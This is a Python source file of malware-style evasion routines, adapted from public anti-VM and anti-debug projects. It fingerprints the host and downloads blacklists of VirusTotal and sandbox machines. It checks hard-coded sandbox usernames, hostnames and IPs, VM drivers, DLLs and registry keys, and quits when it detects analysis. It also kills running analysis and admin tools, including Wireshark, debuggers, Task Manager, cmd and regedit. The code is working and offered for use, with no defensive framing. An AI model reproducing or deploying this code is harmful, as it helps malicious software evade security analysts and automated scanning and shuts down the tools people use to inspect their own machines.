import winreg
import os
import re
import requests
import subprocess
import psutil
import wmi
import platform
import uuid


# Modified script from the original source: https://github.com/6nz/virustotal-vm-blacklist
def getip_():
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        pass
    return ip
def get_guid_():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
        return winreg.QueryValueEx(key_value, "MachineGuid")[0]
    except Exception as e:
        print(e)
def get_hwguid_():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection,
                                   r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
        return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
    except Exception as e:
        print(e)
def vt_check():
    ip = getip_()
    serveruser = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    computer = wmi.WMI()
    os_info = computer.Win32_OperatingSystem()[0]
    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
    gpu = computer.Win32_VideoController()[0].Name
    currentplat = os_name
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    current_baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer').decode().split('\n')[1].strip()
    current_diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber').decode().split('\n')[1].strip()
    current_cpu_serial = subprocess.check_output('wmic cpu get serialnumber').decode().split('\n')[1].strip()
    current_bios_serial = subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip()
    current_baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber').decode().split('\n')[1].strip()
    hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
    pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
    pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
    iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
    maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
    gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
    bios_serial_list = requests.get(
        'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
    baseboardmanufacturerlist = requests.get(
        'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
    baseboardserial_list = requests.get(
        'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
    cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
    diskdriveserial_list = requests.get(
        'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
    hwprofileguidlist = requests.get(
        'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
    machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
    hwguid = f'{get_hwguid_()}'.replace('{', ' ').replace('}', ' ')
    try:
        if hwid in hwidlist.text:
            os._exit(1)
    except:
        os._exit(1)
    try:
        if serveruser in pcusernamelist.text:
            os._exit(1)
    except:
        os._exit(1)
    try:
        if pc_name in pcnamelist.text:
            os._exit(1)
    except:
        os._exit(1)
    try:
        if ip in iplist.text:
            os._exit(1)
    except:
        os._exit(1)
    try:
        if mac in maclist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if gpu in gpulist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_diskdrive_serial in diskdriveserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_cpu_serial in cpuserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_manufacturer in baseboardmanufacturerlist:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_bios_serial in bios_serial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_serial in baseboardserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if get_guid_() in machineguidlist:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if hwguid in hwprofileguidlist:
            os._exit(1)
    except:
        os._exit(1)



# Modified script from the original source: https://github.com/xtekky/Python-Anti-Debug/blob/main/anti-debug.py

def user_check():
        USERS = [
            "BEE7370C-8C0C-4",
            "DESKTOP-NAKFFMT",
            "WIN-5E07COS9ALR",
            "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG",
            "Q9IATRKPRH",
            "XC64ZB",
            "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET",
            "SERVER1",
            "LISA-PC",
            "JOHN-PC",
            "DESKTOP-B0T93D6",
            "DESKTOP-1PYKP29",
            "DESKTOP-1Y2433R",
            "WILEYPC",
            "WORK",
            "6C4E733F-C2D9-4",
            "RALPHS-PC",
            "DESKTOP-WG3MYJS",
            "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O",
            "QarZhrdBpj",
            "ORELEEPC",
            "ARCHIBALDPC",
            "JULIA-PC",
            "d1bnJkfVlH",
            "WDAGUtilityAccount",
            "Abby",
            "patex",
            "RDhJ0CNFevzX",
            "kEecfMwgj",
            "Frank",
            "8Nl0ColNQ5bq",
            "Lisa",
            "John",
            "george",
            "PxmdUOpVyx",
            "8VizSM",
            "w0fjuOVmCcP5A",
            "lmVwjj9b",
            "PqONjHVwexsS",
            "3u2v9m8",
            "Julia",
            "HEUeRzl",
            "fred",
            "server",
            "BvJChRPnsxn",
            "Harry Johnson",
            "SqgFOf3G",
            "Lucas",
            "mike",
            "PateX",
            "h7dk1xPr",
            "Louise",
            "User01",
            "test",
            "RGzcBUyrznReg",
            "OgJb6GqgK0O",
        ]

        try:
            USER = os.getlogin()
            if USER in USERS:
                os._exit(1)
        except:
            pass


def name_check():
        NAMES = [
            "BEE7370C-8C0C-4",
            "DESKTOP-NAKFFMT",
            "WIN-5E07COS9ALR",
            "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG",
            "Q9IATRKPRH",
            "XC64ZB",
            "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET",
            "SERVER1",
            "LISA-PC",
            "JOHN-PC",
            "DESKTOP-B0T93D6",
            "DESKTOP-1PYKP29",
            "DESKTOP-1Y2433R",
            "WILEYPC",
            "WORK",
            "6C4E733F-C2D9-4",
            "RALPHS-PC",
            "DESKTOP-WG3MYJS",
            "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O",
            "QarZhrdBpj",
            "ORELEEPC",
            "ARCHIBALDPC",
            "JULIA-PC",
            "d1bnJkfVlH",
            "NETTYPC",
            "DESKTOP-BUGIO",
            "DESKTOP-CBGPFEE",
            "SERVER-PC",
            "TIQIYLA9TW5M",
            "DESKTOP-KALVINO",
            "COMPNAME_4047",
            "DESKTOP-19OLLTD",
            "DESKTOP-DE369SE",
            "EA8C2E2A-D017-4",
            "AIDANPC",
            "LUCAS-PC",
            "ACEPC",
            "MIKE-PC",
            "DESKTOP-IAPKN1P",
            "DESKTOP-NTU7VUO",
            "LOUISE-PC",
            "T00917",
            "test42",
            "DESKTOP-CM0DAW8",
        ]

        try:
            NAME = os.getenv("COMPUTERNAME")
            if NAME in NAMES:
                os._exit(1)
        except:
            pass
def path_check():
        try:
            for path in [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]:
                if os.path.exists(path):
                    os._exit(1)
        except:
            pass


def platform_check():
        try:
            PLATFORMS = [
                "Windows-XP-5.1.2600-SP2",
                "Microsoft Windows Server 2022 Standard Evaluation",
                "\xd0\x9f\xd1\x80\xd0\xbe\xd1\x84\xd0\xb5\xd1\x81\xd1\x81\xd0\xb8\xd0\xbe\xd0\xbd\xd0\xb0\xd0\xbb\xd1\x8c\xd0\xbd\xd0\xb0\xd1\x8f",
            ]

            PLATFORM = str(platform.version())
            if PLATFORM in PLATFORMS:
                os._exit(1)
        except:
            pass


def ip_check():
        try:
            IPS = [
                "None",
                "88.132.231.71",
                "78.139.8.50",
                "20.99.160.173",
                "88.153.199.169",
                "84.147.62.12",
                "194.154.78.160",
                "92.211.109.160",
                "195.74.76.222",
                "188.105.91.116",
                "34.105.183.68",
                "92.211.55.199",
                "79.104.209.33",
                "95.25.204.90",
                "34.145.89.174",
                "109.74.154.90",
                "109.145.173.169",
                "34.141.146.114",
                "212.119.227.151",
                "195.239.51.59",
                "192.40.57.234",
                "64.124.12.162",
                "34.142.74.220",
                "188.105.91.173",
                "109.74.154.91",
                "34.105.72.241",
                "109.74.154.92",
                "213.33.142.50",
                "109.74.154.91",
                "93.216.75.209",
                "192.87.28.103",
                "88.132.226.203",
                "195.181.175.105",
                "88.132.225.100",
                "92.211.192.144",
                "34.83.46.130",
                "188.105.91.143",
                "34.85.243.241",
                "34.141.245.25",
                "178.239.165.70",
                "84.147.54.113",
                "193.128.114.45",
                "95.25.81.24",
                "92.211.52.62",
                "88.132.227.238",
                "35.199.6.13",
                "80.211.0.97",
                "34.85.253.170",
                "23.128.248.46",
                "35.229.69.227",
                "34.138.96.23",
                "192.211.110.74",
                "35.237.47.12",
                "87.166.50.213",
                "34.253.248.228",
                "212.119.227.167",
                "193.225.193.201",
                "34.145.195.58",
                "34.105.0.27",
                "195.239.51.3",
                "35.192.93.107",
                "213.33.190.22",
                "194.154.78.152",
            ]
            IP = requests.get("https://api.myip.com").json()["ip"]

            if IP in IPS:
                os._exit(1)
        except:
            pass


def registry_check():
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if reg1 != 1 and reg2 != 1:
            os._exit(1)

        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                os._exit(1)
        finally:
            winreg.CloseKey(handle)

def dll_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")

        if os.path.exists(vmware_dll):
            os._exit(1)
        if os.path.exists(virtualbox_dll):
            os._exit(1)


def specs_check():
        try:
            RAM = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
            DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]

            if int(RAM) <= 2:
                os._exit(1)
            if int(DISK) <= 50:
                os._exit(1)
            if int(psutil.cpu_count()) <= 1:
                os._exit(1)
        except:
            pass

def proc_check():
        processes = ["VMwareService.exe", "VMwareTray.exe"]
        for proc in psutil.process_iter():
            for program in processes:
                if proc.name() == program:
                   os._exit(1)


def process_check():
            PROCESSES = [
                "http toolkit.exe",
                "httpdebuggerui.exe",
                "wireshark.exe",
                "fiddler.exe",
                "charles.exe",
                "regedit.exe",
                "cmd.exe",
                "taskmgr.exe",
                "vboxservice.exe",
                "df5serv.exe",
                "processhacker.exe",
                "vboxtray.exe",
                "vmtoolsd.exe",
                "vmwaretray.exe",
                "ida64.exe",
                "ollydbg.exe",
                "pestudio.exe",
                "vmwareuser",
                "vgauthservice.exe",
                "vmacthlp.exe",
                "x96dbg.exe",
                "vmsrvc.exe",
                "x32dbg.exe",
                "vmusrvc.exe",
                "prl_cc.exe",
                "prl_tools.exe",
                "qemu-ga.exe",
                "joeboxcontrol.exe",
                "ksdumperclient.exe",
                "ksdumper.exe",
                "joeboxserver.exe",
                "xenservice.exe",
            ]
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in PROCESSES):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        os._exit(1) # <--- Exits if Accesss is Denied to prevent further suspicious inspection (It was originally pass)
